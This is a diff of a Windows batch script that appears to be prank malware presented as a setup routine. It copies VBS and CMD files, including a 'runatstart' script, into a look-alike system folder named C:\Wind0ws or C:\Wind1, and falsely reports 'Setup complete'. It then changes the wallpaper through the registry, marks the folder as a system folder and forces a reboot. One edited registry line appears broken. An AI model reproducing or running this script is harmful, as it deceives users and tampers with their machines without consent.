@@ -30,14 +30,14 @@ if '%errorlevel%' NEQ '0' (
 
 echo Starting file spread
 
-copy msg.vbs C:\Wind0ws
-copy runatstart.cmd C:\Wind0ws
-copy msg.vbs C:\Wind0ws
-copy stw.vbs C:\Wind0ws
-copy e.cmd C:\Wind0ws
+copy msg.vbs C:\Wind1
+copy runatstart.cmd C:\Wind1
+copy msg.vbs C:\Wind1
+copy stw.vbs C:\Wind1
+copy e.cmd C:\Wind1
 start echo Setup complete
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Wind\back.jpg /f
-ATTRIB  +S C:\Wind0ws /S
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Wind\back.jpg /t
+ATTRIB  +S C:\Wind1 /S
 shutdown -r -c "Almost done"
 
 
